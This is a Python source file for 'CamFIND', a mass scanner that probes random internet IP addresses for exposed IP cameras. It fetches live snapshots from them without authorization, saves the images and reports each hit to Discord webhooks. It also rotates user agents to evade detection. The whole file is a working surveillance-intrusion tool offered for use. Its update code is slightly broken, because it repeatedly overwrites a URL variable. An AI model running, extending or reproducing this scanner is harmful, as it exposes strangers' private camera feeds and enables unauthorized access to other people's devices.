import asyncio
import aiohttp
import random
import time
import os
import json
import warnings
from datetime import datetime
from colorama import init, Fore, Style
import socket
from concurrent.futures import ThreadPoolExecutor

warnings.filterwarnings("ignore", category=RuntimeWarning)
VERSION = "5.5-stable"
REPO_RAW_BASE = "https://raw.githubusercontent.com/nicopancakes/CamFIND/refs/heads/main/config/blacklist.json"
REPO_RAW_BASE = "https://raw.githubusercontent.com/nicopancakes/CamFIND/refs/heads/main/config/campositive.json"
REPO_RAW_BASE = "https://raw.githubusercontent.com/nicopancakes/CamFIND/refs/heads/main/config/keywords.json"
REPO_RAW_BASE = "https://raw.githubusercontent.com/nicopancakes/CamFIND/refs/heads/main/config/snapshotpath.json"
REPO_RAW_BASE = "https://raw.githubusercontent.com/nicopancakes/CamFIND/refs/heads/main/config/useragents.json"

WITH_SCREENSHOT_WEBHOOK = "https://discord.com/api/webhooks/" # <-- Webhook URL
NO_SCREENSHOT_WEBHOOK = "https://discord.com/api/webhooks/" # <-- Webhook URL
# FAQ for Thread Config, Port Worker Config, Base Delay Config:
# CamFIND\docs\help.html

THREADS = 50 # <--- Important: ONLY INCREASE IF: Stable Wired Ethernet/5GHz WiFi, OR Not Seeing Increased Timeouts/Packet Loss.
PORT_WORKERS = 14 
BASE_DELAY = 0.21
os.makedirs("screenshots", exist_ok=True)
os.makedirs("config", exist_ok=True)

seen_ips = set()
scan_count = 0
def load_json(filename: str, default=None):
    path = f"config/{filename}"
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        print(Fore.YELLOW + f"[!] Could not load {filename}, using empty list." + Style.RESET_ALL)
        return default or []


USER_AGENTS = load_json("useragents.json")
CAMERA_POSITIVE = load_json("campositive.json")
STRONG_KEYWORDS = load_json("keywords.json")
TITLE_BLACKLIST = load_json("blacklist.json")
SNAPSHOT_PATHS = load_json("snapshotpath.json")
async def check_for_updates(session: aiohttp.ClientSession):
    files = ["useragents.json", "campositive.json", "keywords.json", "blacklist.json", "snapshotpath.json"]
    updated = []

    print(Fore.CYAN + "Checking for newer updates.." + Style.RESET_ALL)

    for file in files:
        local_path = f"config/{file}"
        remote_url = f"{REPO_RAW_BASE}/{file}"
        try:
            async with session.get(remote_url, timeout=12) as resp:
                if resp.status != 200:
                    continue
                remote_data = await resp.read()

            if os.path.exists(local_path):
                with open(local_path, "rb") as f:
                    if f.read() == remote_data:
                        continue

            print(Fore.YELLOW + f"\n[!] New version of {file} available!" + Style.RESET_ALL)
            choice = input(Fore.WHITE + f"Update {file}? (Y/N): " + Style.RESET_ALL).strip().lower()

            if choice == 'y':
                with open(local_path, "wb") as f:
                    f.write(remote_data)
                updated.append(file)
                print(Fore.GREEN + f"Updated! {file}" + Style.RESET_ALL)

        except Exception:
            pass  

    if updated:
        print(Fore.GREEN + f"\n Updated! {len(updated)} config file(s). Restart main.py\n" + Style.RESET_ALL)

def get_random_ip():
    first = random.randrange(1, 224)
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


async def send_to_discord(webhook_url, embed):
    if not webhook_url:
        return
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
            await s.post(webhook_url, json={"embeds": [embed]}, timeout=10)
    except:
        pass


async def try_get_snapshot(session, ip: str, port: int, headers):
    for path in SNAPSHOT_PATHS:
        try:
            url = f"http://{ip}:{port}{path}"
            async with session.get(url, timeout=3.5, headers=headers, ssl=False) as resp:
                if resp.status == 200 and 'image' in resp.headers.get('content-type', '').lower():
                    data = await resp.read()
                    if len(data) > 6500:
                        return data, url
        except:
            continue
    return None, None


def save_screenshot(ip: str, data: bytes):
    try:
        filename = f"screenshots/{ip}_{int(time.time())}.jpg"
        with open(filename, "wb") as f:
            f.write(data)
        return filename
    except:
        return None


def check_port(ip: str, port: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.5)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

async def scan_ip(ip: str):
    global scan_count
    scan_count += 1
    if ip in seen_ips:
        return
    seen_ips.add(ip)

    print(Fore.CYAN + f"[#{scan_count:05d}] Scanning {ip}" + Style.RESET_ALL, end="\r")
    open_ports = []
    with ThreadPoolExecutor(max_workers=PORT_WORKERS) as executor:
        loop = asyncio.get_running_loop()
        ports = [80, 81, 82, 83, 84, 443, 554, 8080, 8081, 37777]
        futures = [loop.run_in_executor(executor, check_port, ip, p) for p in ports]
        results = await asyncio.gather(*futures, return_exceptions=True)
        open_ports = [p for p in results if isinstance(p, int)]

    if not open_ports:
        return

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
        for port in open_ports:
            try:
                headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}

                async with session.get(f"http://{ip}:{port}", headers=headers) as resp:
                    if resp.status not in (200, 401, 403):
                        continue
                    text = await resp.text(errors='ignore')
                    if len(text) < 700:
                        continue

                    title = "No Title"
                    lower = text.lower()
                    if "<title>" in lower:
                        try:
                            title = text[lower.find("<title>")+7:lower.find("</title>")].strip()[:160]
                        except:
                            pass

                    combined = (text + " " + title).lower()

                    if not any(k in combined for k in CAMERA_POSITIVE) and not any(k in title.lower() for k in STRONG_KEYWORDS):
                        continue
                    if any(b in title.lower() for b in TITLE_BLACKLIST):
                        continue

                    snapshot_bytes, snapshot_url = await try_get_snapshot(session, ip, port, headers)
                    has_screenshot = bool(snapshot_bytes)

                    if snapshot_bytes:
                        save_screenshot(ip, snapshot_bytes)

                    embed = {
                        "title": "CamFIND Positive! `has_screenshot:" + ("true" if has_screenshot else "false") + "`",
                        "color": 0x00ff88 if has_screenshot else 0xffaa00,
                        "fields": [
                            {"name": "IP:Port", "value": f"http://{ip}:{port}", "inline": True},
                            {"name": "Title", "value": title[:100] or "N/A", "inline": False},
                            {"name": "Screenshot", "value": "Yes" if has_screenshot else "No", "inline": True}
                        ],
                        "timestamp": datetime.utcnow().isoformat()
                    }

                    webhook = WITH_SCREENSHOT_WEBHOOK if has_screenshot else NO_SCREENSHOT_WEBHOOK
                    await send_to_discord(webhook, embed)

                    print(Fore.GREEN + f"\n[+] FOUND → http://{ip}:{port} {'[+SCREENSHOT]' if has_screenshot else ''}" + Style.RESET_ALL)

            except:
                continue


async def worker():
    while True:
        try:
            await scan_ip(get_random_ip())
        except:
            pass
        await asyncio.sleep(BASE_DELAY + random.uniform(0.08, 0.34))


async def startup():
    print(Fore.WHITE + f"\nCamFIND v{VERSION} - Stable!" + Style.RESET_ALL)
    async with aiohttp.ClientSession() as session:
        await check_for_updates(session)
    print(Fore.GREEN + f"Loaded {len(USER_AGENTS)} User-Agents | Threads: {THREADS}\n" + Style.RESET_ALL)


async def main():
    await startup()
    tasks = [asyncio.create_task(worker()) for _ in range(THREADS)]
    await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == "__main__":
    init(autoreset=True)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[STOP]" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\nError: {e}" + Style.RESET_ALL)
